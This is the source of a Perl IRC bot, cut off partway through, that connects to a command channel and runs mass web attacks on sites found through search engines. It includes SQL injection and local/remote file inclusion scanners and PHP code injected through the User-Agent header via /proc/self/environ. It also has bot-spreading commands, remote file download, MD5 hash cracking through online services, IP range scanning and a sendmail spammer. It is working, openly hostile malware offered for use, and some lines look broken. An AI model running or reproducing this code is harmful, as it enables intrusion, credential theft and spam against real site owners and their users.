#!/usr/bin/perl
use IO::Socket::INET ;
use IO::Socket;
#use warnings;
use LWP::UserAgent;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common;
use Socket;
my $info = "";
my $nick  = "Scan".(int(rand(500)));
my @spychan=("#kabo");
my @md5 =
(
['http://md5.rednoize.com/?q=[HASH]&s=md5&go=Search', '', '<div id="result" >(.*?)</div>'],
['hash=[HASH]&Submit=Submit', '>[a-f0-9]{32}</TD><TD align="middle" nowrap="nowrap" width=90>(.*?)</TD>'],
['http://securitystats.com/tools/hashcrack.php', 'inputhash=[HASH]&type=MD5&Submit=Submit', '<BR>[a-f0-9]{32} = (.*?)</td>'],
['http://md5decrypter.com/index.php', 'hash=[HASH]&submit=Decrypt', '<b class=\'red\'>Normal Text: </b>(.*?)\n']
);

my @tabele=('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');

my @kolumny=('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
          'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
          'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
          'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
          'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
          'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');


my @GoogleDomene=("www.google.com","www.google.it","www.google.pl","www.google.com.mx","www.google.co.uk",
					"www.google.com.br","www.google.fr","www.google.ie","www.google.ae","www.google.ro","www.google.es",
					"www.google.ca","www.google.no","www.google.de","www.google.fr","www.google.cz","www.google.lt");
			
my @ver=("mIRC32 v5.91 K.Mardam-Bey","mIRC v6.2 Khaled Mardam-Bey",
	"mIRC v6.03 Khaled Mardam-Bey","mIRC v6.14 Khaled Mardam-Bey",
	"irssi v0.8.10 - running on OpenBSD i386",
	"irssi v0.8.2 - running on Linux i386",
	"XChat-GNOME IRC Chat 0.16 Linux 2.6.20-8-generic [i686]",
	"irssi v0.8.10 - running on Linux i586\001","\001irssi v0.8.10 - running on FreeBSD i386",
	"ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.8+OperMods v1.0 by acidflash - Almost there");

my @domene=("info","net","org","no","se","de","com","pe","br","ca","fi","pl","ro","ru","in","do","su","pk","ms","ve",
"cy","as","ae","de","ve","hu","ar","at","ro","ru","mm","mn","nm","a","b","c","info","gr","pe","br","es","tr","il","ie",
"eg","fi","do","ms","ws","ps","net","com","org","ch","cc","br","lv","sz","rj","tz","io","tf","tp","tg","to","tt","info",
"sh","lc","va","st","sn","sc","sl","sg","so","lk","za","sd","se","sr","jm","sg","id","cl","cx","ca","nz","pk","mil","hu");

my @useragents=('Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1',
'Mozilla/4.0 (compatible; MSIE is not me; DAUMOA/1.0.1; DAUM Web Robot; Daum Communications Corp., Korea) ',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.9) Geck','Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.8) Geck',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1) Gecko/',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; nl; rv:1.8.0.9) Geck','Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

#%SIG = ('HUP','IGNORE','INT','IGNORE','PIPE','IGNORE','TERM','IGNORE');
sub randnick(){return "Bov" . int(rand(1)*100) . int(rand(1)*200) . int(rand(1)*300);}
sub msg($$){print $connection "PRIVMSG #kabo  : $_[0]  $_[1]\r\n";}
my $processo = "/http/";
my $pid=fork;

exit if $pid;

$0="$processo"."\0"x16;
$connection = IO::Socket::INET->new(PeerAddr=>"irc.stmikbg.com",PeerPort=>"6667",Proto=>'tcp',Timeout=>'30') or die " [!] Couldnt Connect To $server\n";
print $connection "USER XxX Jo * :Hello\r\n";
print $connection "NICK ".$nick."\r\n";
while($response = <$connection>)
{ 

   print $response;
	#-------- Time Too Shiiit.
    if($response =~ m/:(.*) 00(.*) (.*) :/) { print $connection "JOIN #kabo\r\n"; } #---WORK
	if($response =~ m/^PING (.*?)$/gi) { print $connection "PONG ".$1."\r\n"; } #---WORK
	if($response =~ m/:$nick\s+!hi/) { &msg("Hi"," 9 dude"); } #--- NO
	if($response =~ m/:$nick\s+!ret/) { &msg("[Response]","$info"); } #--- NO
	if($response =~ m/:$nick\s+!res\s+(.*)/) { my $spa=$1; $info=$spa; &msg("[Response]","$info");  } #--- NO
	if($response =~ m/:$nick\s+!spy/) { foreach $spmchanz (@spychan) { print $connection "JOIN ".$spmchanz."\r\n"; } } #---WORK
	if($response =~ m/:$nick\s+!sayspy\s+(.*)/) { my $wiad = $1; foreach $spmchanz (@spychan) { print $connection "PRIVMSG ".$spmchanz.":".$wiad."\r\n"; } } #---WORK
	if($response =~ m/:$nick\s+!raw\s+(.*)/) { print $connection $1."\r\n"; } #---WORK
	if($response =~ m/:$nick\s+!sqlbrut\s+(.*)\s+(\d+)/) { if(fork() == 0){ &sqlbrute($1,$2); }} #---WORK
	if($response =~ m/:$nick\s+!md5\s+(.*)/) { my $password = $1; my $cleartext = searchPlaintext($password); if ($cleartext) { msg("[MD5]","$cleartext"); } else { print "Cleartext:\tNot found\n"; } } #---WORK
	if($response =~ m/:$nick\s+!zakres\s+(.*?)\s+(.*?)\s+(.*)/) { if(fork() == 0){ range($1,$2,$3)}} #---WORK
	if($response =~ m/:$nick\s+!down\s+(.*?)\s+(.*)/) { &getstore($1,$2) &msg("[Download]"," Save In ".$2);} #---WORK
	if($response =~ m/:$nick\s+!deh5\s+(.*?)\s+(.*)/) { if(fork() == 0){ listacrack($1)}} #---WORK
	if($response =~ m/:$nick\s+!exe\s+(.*?)\s+(.*)/) { if(fork() == 0){ &lfiiexe($1,$2); }} #---WORK
	if($response =~ m/:$nick\s+!spam\s+(.*?)\s+(.*?)\s+(.*)\s+-name(.*)/) { &getstore($1,"/tmp/spam.txt") &getstore($2,"/tmp/mail.html") &spamer($3,$4); } #--sciertwo !spam http://site/mailist.txt http://site/mail.html subject -name Voo_Doo
	#-------- End Shiiit.zw
    #-------- Scan shit
#-- FUCK IT     if($response =~ m/:$nick\s+!router\s+(.*?)\s+(.*)/) { if(fork() == 0){ msg("debugl","1 $1 2 $2");&rou($1,$2)}} #---WORK
     if($response =~ m/:$nick\s+!ssql\s+(.*)/) { if(fork() == 0){ &ssql($1); }} #---WORK
     if($response =~ m/:$nick\s+!xml\s+(.*?)\s+(.*)/) { if(fork() == 0){ &xmlstart($1,$2); }} #---WORK
     if($response =~ m/:$nick\s+!lfi\s+(.*?)\s+(.*)/) { if(fork() == 0){ &lfi($1,$2); }} #---WORK
	  if($response =~ m/:$nick\s+!rfi\s+(.*?)\s+(.*)/) { if(fork() == 0){ &rfi($1,$2); }} #----- powinno dzialac ale pida
	  if($response =~ m/:$nick\s+!sql\s+(.*?)\s+(.*)/) { if(fork() == 0){ &sqld($1,$2); }} #----powinno dzoalac
	  if($response =~ m/:$nick\s+!zen\s+(.*)/) { if(fork() == 0){ &xzen($1); }} #----- powinno dzialac ale pida
#-------- Aut
	  if($response =~ m/:$nick\s+!autorfi\s+(.*?)\s+(.*)/) { if(fork() == 0){ &getstore($1,$2); &msg("[Download]"," Save In ".$2); &podajrfi($2); }} #------ test
	  if($response =~ m/:$nick\s+!autolfi\s+(.*?)\s+(.*)/) { if(fork() == 0){ &getstore($1,$2); &msg("[Download]"," Save In ".$2); &podajlfi($2); }} #--- DZIALA
	  if($response =~ m/:$nick\s+!autoxml\s+(.*?)\s+(.*)/) { if(fork() == 0){ &getstore($1,$2); &msg("[Download]"," Save In ".$2); &podajxml($2); }} #--- DZIALA
	  if($response =~ m/:$nick\s+!autozen\s+(.*?)\s+(.*)/) { if(fork() == 0){ &getstore($1,"/tmp/".$2); &msg("[Download]"," Save In ".$2); &podajzen($2); }} #--- DZIALA
	  #--- end while
	}
	
								sub xmlstart() {
								my ($bug, $dork, $wiad) = ($_[0], $_[1], "[Xml-Scan]");
								&msg($wiad," Started $bug Dork: $dork");
								my $file = "xml".int(rand(900)).".txt";
								find($dork, $file);
								xmls($bug, $file, $dork);
								&msg($wiad," End $bug Dork: $dork");
								}
								sub xzen() {
								my ($dork, $wiad) = ($_[0], "[Zen-Scan]");
								&msg($wiad," Started Dork: $dork");
								my $file = "zen".int(rand(900)).".txt";
								find($dork, $file);
								zen("index.php",$file, $dork);
								&msg($wiad," End $bug Dork: $dork");
								}
								sub lfi() {
								my ($bug, $dork, $wiad) = ($1, $2, "[Lfi-Scan]");
								&msg($wiad," Started $bug Dork: $dork");
								my $file = "lfi".int(rand(900)).".txt";
								my $d0rk = &clean($dork);
								find($d0rk, $file);
								lfis($bug, $file, $d0rk);
								&msg($wiad," End $bug Dork: $d0rk");
								}

								sub ssql() {
								my ($dork, $wiad) = ($1, "[Sql-Scan]");
								&msg($wiad," Started Dork: $dork");
								my $file = "ssql".int(rand(200)).".txt";
								my $d0rk = &clean($dork);
								find($d0rk, $file);
								&ssqldwa($file, $d0rk);
								&msg($wiad," End $bug Dork: $d0rk");
								}
								sub rfi() {
								my ($bug, $dork, $wiad) = ($1, $2, "[Rfi-Scan]");
								&msg($wiad," Started $bug Dork: $dork");
								my $file = "rfi".int(rand(200)).".txt";
								my $d0rk = &clean($dork);
								find($d0rk, $file);
								&rfidwa($bug, $file, $d0rk);
								&msg($wiad," End $bug Dork: $d0rk");
								}
								
								sub sqld() {
								my ($bug, $dork, $wiad) = ($1, $2, "[Sql-Scan]");
								&msg($wiad," Started $bug Dork: $dork");
								my $file = "sqld".int(rand(900)).".txt";
								find($dork, $file);
								sqld2($bug, $file, $dork);
								&msg($wiad," End $bug Dork: $dork");
								}

								#------------ SOBY
sub rou() {
my $start = $_[0];
my $startend = $_[1];
my $p = 80;
msg("[Routers]","Password Scan $start - $startend ");
my @ip_start=split(/\./,$start);
my @ip_end=split(/\./,$startend);
$p = 80;
for($i=$ip_start[0];$i<=$ip_end[0];$i++) 
{
 for($j=$ip_start[1];$j<=$ip_end[1];$j++) 
 {
  for($k=$ip_start[2];$k<=$ip_end[2];$k++) 
  {
   for($l=$ip_start[3];$l<=$ip_end[3];$l++) 
   {
    $ip = "$i.$j.$k.$l";
    # usleep(500000);
   # sleep(1);
    print "Connecting with $ip:$p\n";
	   if ($sox = IO::Socket::INET->new(PeerAddr=>$ip,PeerPort=>$p,Proto=>'tcp',Timeout=>'1'))
		{
##--------
&msg("scan","$ip $p open");
&msg("scan","$ip $p open");

#--------
}
close $sox;
		}
		}

   }
  }
 }

					
sub onet() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 50;$i += 1) {
        my $mlink = ( "http://szukaj.onet.pl/query.html?qt=".key($dork)."&p=".$i);
        my $re = query($mlink);
        while ($re =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g) {
            my $h = $1;
            push(@sgrep,$h);
            
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}



sub szukacz() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 400;$i += 20) {
        my $mlink = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($dork)."&start=".$i);
        my $re = query($mlink);
        while ($re =~ m/<a title=\"?http:\/\/(.+?)\//g) {
            my $h = $1;
            push(@sgrep,$h);
            
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}



sub spamer() {
&msg("Spam Started");
my $mailist = "/tmp/spam.txt";
my $mail = "/tmp/mail.html";
my $subje = $_[0];
my $from = $_[1];
open(FILE, $mailist);
print("open $mailist \r\n");
while(<FILE>) {
my $jo=$_;
chomp $jo;
$jo=~s/\r//;
if($jo=~ /(.*)/g){
my $raz = $1;
my $mailtype = "content-type: text/html";
my $sendmail = '/usr/bin/senmail'; 
my $eeng = &query($mail); 
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject $subje";
print SENDMAIL "From: $from\n\n";
print SENDMAIL "To: $raz\n\n";
print SENDMAIL "$eeng";
close (SENDMAIL); 
 }
my $ran = int(rand(5));
sleep $ran;
 }
 close(FILE); 
&msg("Spam Started");
`rm -rf $mailist $mail`;
}  
								

sub podajlfi() {
my $czaj = $_[0];
open(FILE, $czaj);
print("open $czaj \r\n");
 while(<FILE>) {
my $jo=$_;
	chomp $jo;
#	$jo=~s/\n//;
	$jo=~s/\r//;
      $jo =~ s/!scan(\s+)//g;
      $jo =~ s/!scan(.)//g;
	  if($jo=~ /(.*?[=])\s+(.*)/g){
my $bug = $1;
my $dork = $2;
 #msg("[Lfi-Autoscan]","teeest this is bug $bug and dork $dork");
 &lfi($bug,$dork);
 }
 #sleep 1*60; # need ?
 }
close(FILE);
`rm -rf $fil`;
}

sub podajzen() {
my $czaj = "/tmp/".$_[0];
 msg("[debug-Autoscan]","I GET $czaj");
open(FILE, $czaj);
while(<FILE>) {
my $jo=$_;
	chomp $jo;
#	$jo=~s/\n//;
	$jo=~s/\r//;
      $jo =~ s/!scan(\s+)//g;
      $jo =~ s/!scan(.)//g;
	  if($jo=~ /(.*?[=])\s+(.*)/g){
my $bug = $1;
my $dork = $2;
 msg("[debug-Autoscan]","teeest this is bug $bug and dork $dork");
 &xzen($dork);
 }
 #sleep 1*60; # need ?
 }
close(FILE);
`rm -rf $fil`;
}

sub podajxml() {
my $czaj = $_[0];
open(FILE, $czaj);
print("open $czaj \r\n");
 while(<FILE>) {
my $jo=$_;
	chomp $jo;
#	$jo=~s/\n//;
	$jo=~s/\r//;
      $jo =~ s/!scan(\s+)//g;
      $jo =~ s/!scan(.)//g;
	  if($jo=~ /(.*?[=])\s+(.*)/g){
my $bug = $1;
my $dork = $2;
 #msg("[Rfi-Autoscan]","teeest this is bug $bug and dork $dork");
 &xmlstart($bug,$dork);
 }
 #sleep 1*60; # need ?
 }
close(FILE);
`rm -rf $fil`;
}
sub podajrfi() {
my $czaj = $_[0];
open(FILE, $czaj);
print("open $czaj \r\n");
 while(<FILE>) {
my $jo=$_;
	chomp $jo;
#	$jo=~s/\n//;
	$jo=~s/\r//;
      $jo =~ s/!scan(\s+)//g;
      $jo =~ s/!scan(.)//g;
	  if($jo=~ /(.*?[=])\s+(.*)/g){
my $bug = $1;
my $dork = $2;
 #msg("[Rfi-Autoscan]","teeest this is bug $bug and dork $dork");
 &rfi($bug,$dork);
 }
 #sleep 1*60; # need ?
 }
close(FILE);
`rm -rf $fil`;
}
sub ssqldwa () {
    my $name = $_[0];
    my $dork = $_[1];
    my @forks;
    my @testados;    
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
     &msg("[Sql-Scan]"," Total ". scalar(@toexploit). " Site. Exploit Started.");   
    foreach my $site (@toexploit) {
        my $test  = "http://" . $site . "+and+1=0--";
        print "$test\n";
        $count++;
        if ( $count % 100 == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        if($count %100 == 0){
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . "+and+1=0--";
            my $print = "http://" . $site . "+and+1=0--";
            my $re    = query($test,"3");
            if ( $re =~ m/Microsoft OLE DB Provider for SQL Server/ || $re =~ m/Unclosed quotation mark/ ) {
                &msg("[Sql-Scan]"," Vuln: $print");
            }
	    elsif ($re =~m/mysql_/ || $re =~m/Division by zero in/) {
		&msg("[Sql-Scan]"," Vuln: $print");
		 }
	    elsif($re =~m/Microsoft JET Database/ || $re =~m/ODBC Microsoft Access Driver/) {
		&msg("[Sql-Scan]"," Vuln: $print");
		}
	    elsif($re =~m/Microsoft OLE DB Provider for Oracle/) {
		&msg("[Sql-Scan]"," Vuln: $print");
		 }
		  elsif($re =~m/mysql_fetch_array/) {
		&msg("[Sql-Scan]"," Vuln: $print");
		 }

            exit(0);
        }
        $num++;
    } 
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

								
sub lfis () {
    my $bug  = $_[0] ;
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    `rm -rf $name`;
    my @toexploit = unici(@tot);
    &msg("[Lfi-Scan]"," Total ". scalar(@toexploit). " Site. Exploit Started.");
    foreach my $site (@toexploit) {
        $count++;
        if ( $count % 100 == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug . "./../../../../../../../../etc/passwd%00";
            my $tes  = "http://" . $site . $bug . "./../../../../../../../../etc/passwd";
print("$test \r\n");            
            my $re    = &query($test);
            my $er    = &query($tes);
            if ( $re =~ /root:x:/ ) {
				&msg("[Lfi-Scan]"," 15[7Vuln15:2 $test 15]");
				&lfiquery($site,$bug);
            }
            if ( $er =~ /root:x:/ ) {
				&msg("[Lfi-Scan]"," 15[7Vuln15:2 $tes 15]");
				&lfiquer($site,$bug);
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub rfidwa() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = 50;
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot,$a);
    }
    close($file);
    `rm -rf $name`;
    my @toexploit = unici(@tot);
    &msg("[Rfi-Scan]"," Total ". scalar(@toexploit). " Site. Exploit Started.");
    sleep(1);
    foreach my $site(@toexploit) {
            my $test  = "http://".$site.$bug.$info."?&mode=id";
        $count++;
        if ($count % $rfipid == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if($count %100 == 0){
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
		    my $test  = "http://".$site.$bug.$info."?&cmd=id";
            my $re    = &query($test);
            if ($re =~ m/%RFI%/g) {
				&msg("[Rfi-Scan]"," Vuln $test");
				&safemode($site,$bug)
			}
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}

sub zen() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = 50;
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot,$a);
    }
    close($file);
    `rm -rf $name`;
    my @toexploit = unici(@tot);
    &msg("[Zen-Scan]"," Total ". scalar(@toexploit). " Site. Exploit Started.");
    sleep(1);
    foreach my $site(@toexploit) {
            my $test  = "http://".$site.$bug;
        $count++;
        if ($count % $rfipid == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if($count %100 == 0){
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
		    my $test  = "http://".$site.$bug;
            my $re    = &query($test);
            if ($re =~ m/Cart&trade;/g) {
				zzen($site);
			}
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}



sub zzen {

my $url = "http://".$_[0];
my $zuo = system("php /tmp/v.txt $url");

my $blr = &query($url."/images/gov.php");
my $zi = $url."/images/gov.php";
if($blr =~ m/ecology/g) {
&irc_msg("#kabo","15[7Vuln15: 2$zi 15]");
}
}


sub safemode() {
my $site = $_[0];
my $bug = $_[1];
my $razem = "http://".$site.$bug.$info."?";
my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc) = &info_os($razem."?&mode=id");

  if ($safe =~ /OFF/) { $safemode = "OFF"; } elsif ($safe =~ /ON/) { $safemode ="ON"; } else { $safemode ="-"; }
  if ($disfunc) { $disfunc = "[Disfunc] [ $disfunc ]"; } else { $disfunc = ""; }
  if ($perm =~/W/) { $perm = "$perm"; } else { $perm = "$perm"; }
  my $S1 = "[".$safemode."] [ $os ] [ $sb ]";
  my $S2 = "[ Uname ] [ $uname ] [ User ] [ $user / $uid ] [ Server ] [ $server ] ";
  my $S3 = "[ Dir ] [ $dir $perm ] [ HDD ] [ $hdd ] $disfunc ";

  &msg("[Rfi-Info]"," $S1"); &msg("[Rfi-Info]"," $S2"); &msg("[Rfi-Info]"," $S3");
  
####------- Spread mode   |  phpbot sqlbot bovbot perlbot bindport
&query($razem."&mode=phpbot");
&query($razem."&mode=safe");
&query($razem."&mode=sqlbot");
&query($razem."&mode=bovbot");
&query($razem."&mode=perlbot");
&query($razem."&mode=bindport");

 }

sub info_os {
  my $url = $_[0];
  my @info;
  my $h  = &query($url);
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  while ( $h =~ m/<br>SAFE: (.+?)<br>/g ) { $safe = $1; }
  while ( $h =~ m/<br>OS: (.+?)<br>/g ) { $os = $1; }
  while ( $h =~ m/<br>UNAME: (.+?)<br>/g ) { $uname = $1; }
  while ( $h =~ m/<br>SERVER: (.+?)<br>/g ) { $server = $1; }
  while ( $h =~ m/<br>USER: (.+?)<br>/g ) { $user = $1; }
  while ( $h =~ m/<br>UID: (.+?)<br>/g ) { $uid = $1; }
  while ( $h =~ m/<br>DIR: (.+?)<br>/g ) { $dir = $1; }
  while ( $h =~ m/<br>PERM: (.+?)<br>/g ) { $perm = $1; }
  while ( $h =~ m/<br>HDD: (.+?)<br>/g ) { $hdd = $1; }
  while ( $h =~ m/<br>DISFUNC: (.+?)<br>/g ) { $disfunc = $1; }
  push (@info,$safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  return @info;
}


sub sqld2 () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/\n//g;
        push( @tot, $a );
    }
    close filez;
    `rm -rf $name`;
    my @toexploit = unici(@tot);
    foreach my $site (@toexploit) {
        $count++;
        if ( $count % 100 == 0 ) {
	    foreach my $f(@forks){
                waitpid($f,0);
            }
	    $num = 0;
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://".$site.$bug;
print("$test \r\n");            
            my $re    = &query($test);
            if ($re =~ m/:(.*)::(.*):/g) {
				my ($user,$hash) = ($1,$2)
				&msg("[Sql-Scan]"," Found $test");
				my $cleartext = &searchPlaintext($hash); if ($cleartext) { 
				&msg("[Sql-Scan]"," Login:$user Passwd:$hash / Decrypt Hash:$cleartext");
				} else { 
				&msg("[Sql-Scan]"," Login:$user Passwd:$hash");
				}
			}
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}



#

sub lfiquery() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $bug = $_[1];
print("$url i $cmd \r\n");
my $site ="http://".$url.$bug."./../../../../../../../proc/self/environ%00";
my $hie = "jcfs<?system(\"uname -a 2> /dev/stdout\"); ?>jcfs";
$browser->agent("$hie");
$browser->timeout(4);
$response = $browser->get( $site );
if ($response->content =~ /jcfs(.*)jcfs/s) {
&msg("[LFI2EXE]: 15[4Environ15: 2$site | 6$1 15]");
#&lfispread($url,$bug);
}}

sub lfiquer() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $bug = $_[1];
print("$url i $cmd \r\n");
my $site ="http://".$url.$bug."./../../../../../../../proc/self/environ";
my $hie = "jcfs<?system(\"uname -a 2> /dev/stdout\"); ?>jcfs";
$browser->agent("$hie");
$browser->timeout(4);
$response = $browser->get( $site );
if ($response->content =~ /jcfs(.*)jcfs/s) {
&msg("[LFI2EXE]: 15[4Environ15: 2$site | 6$1 15]");
#&lfispread($url,$bug);
}}
sub lfispread() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $bug = $_[1];
my $site ="http://".$url.$bug."./../../../../../../../proc/self/environ%00";
my $hie = "jcfs<?include(\"".$miau."pbot.txt\"); ?>jcfs";
$browser->agent("$hie");
$browser->timeout(4);
$response = $browser->get( $site );
$response->content;
}

sub lfiiexe() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
print($url." i ".$cmd."\r\n");
my $site = $url . "./../../../../../../../proc/self/environ%00";
$browser->agent("jcfs<?".$cmd."?>jcfs");
$browser->timeout(4);
$response = $browser->get( $site );
if ($response->content =~ /jcfs(.*)jcfs/s) {
&msg("[LFI2EXE]:"," $1 ");
}}

sub find() {
    my $dork = $_[0];
    my $name = $_[1];
    my @engine;
	$engine[0] = fork();
   if ($engine[0] == 0) {
        my @msn = &msn($dork, $name);
        &msg("[MSN]","-". scalar(@msn). "  ");
        exit(0);
    }
    $engine[1] = fork();
    if ($engine[1] == 0) {
        my @google = &google($dork, $name);
        &msg("[Google]","-". scalar(@google). "  ");
        exit(0);
    }

    $engine[2] = fork();
    if ($engine[2] == 0) {
        my @virgilio = &virgilio($dork, $name);
        &msg("[Virgilio]","-". scalar(@virgilio). "  ");
        exit(0);
    }
    
    $engine[3] = fork();
    if ($engine[3] == 0) {
        my @altavista = &altavista($dork, $name);
        &msg("[Altavista]","-". scalar(@altavista). "  ");
        exit(0);
    }
 
    $engine[4] = fork();
    if ($engine[4] == 0) {
        my @ask = &ask($dork, $name);
        &msg("[Ask]","-". scalar(@ask). "  ");
        exit(0);
    }
   
    $engine[5] = fork();
    if ($engine[5] == 0) {
        my @webde = &webde($dork,$name);
        &msg("[Webde]","-". scalar(@webde). "  ");
        exit(0);
    }
     
    $engine[6] = fork();
    if ($engine[6] == 0) {
       my @uol = &uol($dork,$name);
       &msg("[Uol]","-".scalar(@uol)."  ");
        exit(0);
    }
    $engine[7] = fork();
    if ($engine[7] == 0) {
       my @onet = &onet($dork,$name);
       &msg("[Onet]","-".scalar(@onet)."  ");
        exit(0);
    }
    $engine[8] = fork();
    if ($engine[8] == 0) {
       my @szuk = &szukacz($dork,$name);
       &msg("[Szukacz]","-".scalar(@szuk)."  ");
        exit(0);
    }
    $engine[9] = fork();
    if ($engine[9] == 0) {
       my @msnde = &msnde($dork,$name);
       &msg("[MSNDE]","-".scalar(@msnde)."  ");
        exit(0);
    }

    $engine[10] = fork();
    if ($engine[10] == 0) {
       my @msnbe = &msnbe($dork,$name);
       &msg("[MSNBE]","-".scalar(@msnbe)."  ");
        exit(0);
    }

    $engine[11] = fork();
    if ($engine[11] == 0) {
       my @msnfr = &msnfr($dork,$name);
      &msg("[MSNFR]","-".scalar(@msnfr)."  ");
        exit(0);
    }

    $engine[12] = fork();
    if ($engine[12] == 0) {
       my @msncz = &msncz($dork,$name);
       &msg("[MSNCZ]","-".scalar(@msncz)."  ");
        exit(0);c
    }
        $engine[13] = fork();
    if ($engine[13] == 0) {
       my @work2 = &work2($dork,$name);
       &msg("[Walla]","-".scalar(@work2)."  ");
        exit(0);c
    }
        $engine[14] = fork();
    if ($engine[14] == 0) {
       my @work = &work($dork,$name);
       &msg("[NetMenu]","-".scalar(@work)."  ");
        exit(0);c
    }
        $engine[15] = fork();
    if ($engine[15] == 0) {
       my @work3 = &work3($dork,$name);
       &msg("[Rediff]","-".scalar(@work3)."  ");
        exit(0);c
    }
    foreach my $e(@engine){
        waitpid($e,0);
    }

}

sub work() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 10;$i += 1) {
        my $mlink = ( "http://netmenu.metaseek.nl/search/web/".$i."/".key($dork));
        my $re = query($mlink);
        while ($re =~ m/<a target=_blank href=\"http:\/\/(.+?)\//g) {
            my $h = $1;
            push(@sgrep,$h);
            
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}


sub work2() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 80;$i += 1) {
